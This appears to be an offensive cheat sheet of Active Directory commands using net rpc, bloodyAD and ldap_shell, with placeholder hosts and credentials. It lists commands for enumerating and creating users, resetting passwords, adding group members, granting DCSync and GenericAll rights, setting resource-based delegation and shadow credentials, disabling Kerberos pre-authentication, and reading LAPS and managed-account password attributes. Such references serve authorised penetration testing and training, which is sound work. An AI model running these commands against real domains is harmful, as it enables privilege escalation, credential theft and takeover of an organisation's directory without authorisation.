-------------------
      net rpc
-------------------

net rpc user (list all user)
net rpc user -U <domain.local>/<user>%'<password>' -S <ip>
net rpc user -U <domain.local>/<user>%'<password>' -S <ip> -W <domain>

net rpc add (add user)
net rpc add <new username> <new password> -U <domain.local>/<user>%'<password>' -S <ip>
net rpc add <new username> <new password> -U <domain.local>/<user>%'<password>' -S <ip>

net rpc password (change user password)
net rpc password <target user> <new password> -U <domain.local>/<user>%'<password>' -S <ip>

net rpc group
net rpc group members (list group members)
net rpc group members <target group> -U <domain.local>/<user>%'<password>' -S <ip>

net rpc group addmem (add member to group)
net rpc group addmem <target group> <target user> -U <domain.local>/<user>%'<password>' -S <ip>


-------------------
      bloodyAD
-------------------

1. bloodyAD --host <ip> -d <domain> -u <username> get <membership, object, search, writable>

bloodyAD --host <ip> -d <domain> -u <username> get membership <target - sAMAccountName, DN or SID>
bloodyAD --host <ip> -d <domain> -u <username> get object <target - groups, computers$, users> --attr <e.g. member, userAccountControl, msDS-ManagedPassword, ms-Mcs-AdmPwd>

bloodyAD --host <ip> -d <domain> -u <username> get search --filter <ldap filter> --attr <attributes> --base <DN of the parent object - default: DOMAIN>
bloodyAD --host <ip> -d <domain> -u <username> get search --filter "(objectClass=user)"
bloodyAD --host <ip> -d <domain> -u <username> get search --attr sAMAccountName
bloodyAD --host <ip> -d <domain> -u <username> get search --base "DC=domain,DC=local"
bloodyAD --host <ip> -d <domain> -u <username> get search --base "CN=Deleted Objects,DC=bloody,DC=local" --filter "(isDeleted=TRUE)" --attr sAMAccountName,distinguishedName,lastKnownParent -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 (to display tombstoned, deleted and recycled objects and their linked attributes)

bloodyAD --host <ip> -d <domain> -u <username> get writable --otype <object type - ALL,OU,USER,COMPUTER,GROUP,DOMAIN,GPO> --right <ALL,WRITE,CHILD> --details --include-del



2. bloodyAD --host <ip> -d <domain> -u <username> set <object, owner, password, restore>

bloodyAD --host <ip> -d <domain> -u <username> set object <target - sAMAccountName, DN or SID> <attribute - name of the attribute>
bloodyAD --host <ip> -d <domain> -u <username> set owner <target user> <target owner>
bloodyAD --host <ip> -d <domain> -u <username> set password <target user> <new password>
bloodyAD --host <ip> -d <domain> -u <username> set restore <target user>
bloodyAD --host <ip> -d <domain> -u <username> set restore <target user> --newName <new name for the restored object>
bloodyAD --host <ip> -d <domain> -u <username> set restore <target user> --newParent <new parent for the restored object>

3. bloodyAD --host <ip> -d <domain> -u <username> add <computer, dcsync, dnsRecord, genericAll, groupMember, rbcd>

bloodyAD --host <ip> -d <domain> -u <username> add computer <hostname - computer name with trailing $> <password>
bloodyAD --host <ip> -d <domain> -u <username> add dcsync <trustee - sAMAccountName, DN or SID of the trustee>

bloodyAD --host <ip> -d <domain> -u <username> add dnsRecord <name - name of the ndsNode object (hostname) which will contain new record> <data - DNS record data for most record types this will be the destination hostname or IP address, for TXT records this can be used for text>
bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody add dnsRecord test.bloody.local 8.8.8.8

bloodyAD --host <ip> -d <domain> -u <username> add dnsRecord <name> <data> --dnstype <A,AAAA,CNAME,MX,PTR,SRV,TXT>

bloodyAD --host <ip> -d <domain> -u <username> add genericAll <target> <trustee - user which will have full control on target>
bloodyAD --host <ip> -d <domain> -u <username> add groupMember <target group> <target member>
bloodyAD --host <ip> -d <domain> -u <username> add rbcd <target> <service>
bloodyAD --host <ip> -d <domain> -u <username> add shadowCredentials <target> --path <filepath for the generated Key Credentials certificate - default: CurrentPath>
bloodyAD --host <ip> -d <domain> -u <username> add uac <target> -f <name of property flag to add e.g. -f DONT_REQ_PREAUTH, -f DONT_EXPIRE_PASSWORD>
bloodyAD --host <ip> -d <domain> -u <username> add user <sAMAccountName for new user> <new password>

4. bloodyAD --host <ip> -d <domain> -u <username> remove <dcsyncm dnsRecord, genericAll, groupMember, object, rbcd, shadowCredentials, uac>

bloodyAD --host <ip> -d <domain> -u <username> remove dcsync <trustee>
bloodyAD --host <ip> -d <domain> -u <username> remove dnsRecord <name> <data> --dnstype <A,AAAA,CNAME,MX,PTR,SRV,TXT>
bloodyAD --host <ip> -d <domain> -u <username> remove genericAll <target> <trustee>
bloodyAD --host <ip> -d <domain> -u <username> remove groupMember <target group> <target member>
bloodyAD --host <ip> -d <domain> -u <username> remove object <target>
bloodyAD --host <ip> -d <domain> -u <username> remove rbcd <target> <service>
bloodyAD --host <ip> -d <domain> -u <username> remove shadowCredentials <target> --key <RSA key of Key Credentials to remove from the target, removes all if key not specified>
bloodyAD --host <ip> -d <domain> -u <username> remove uac <target> -f <name of property flag to remove e.g. -f LOCKOUT -f ACCOUNTDISABLE>


-------------------
    LDAP Shell
-------------------

ldap_shell <domain.local>/<username>:'<password>' -dc-host <dc.hostname.local>
ldap_shell <domain.local>/<username>:'<password>' -k -no-pass -dc-host <dc.hostname.local>




